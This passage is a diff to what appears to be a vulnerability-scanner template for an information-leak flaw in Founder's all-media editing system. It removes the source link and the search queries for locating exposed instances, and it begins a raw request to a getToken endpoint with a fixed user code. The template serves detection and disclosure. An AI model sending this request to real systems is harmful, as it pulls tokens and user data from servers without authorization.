@@ -3,12 +3,8 @@ info:
   name: 北大方正-getUserInfo-信息泄露
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/skqt074c4e6rapfd'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: skqt074c4e6rapfd
-    fofa: fofa:app="FOUNDER-全媒体采编系统" hunter:app.name="北大方正全媒体采编系统"
 http:
 - raw:
   - 'GET /newsedit/tokenHelp/getToken.do?userCode=a18f178d935d2284a771f6f5903d7160 HTTP/1.1
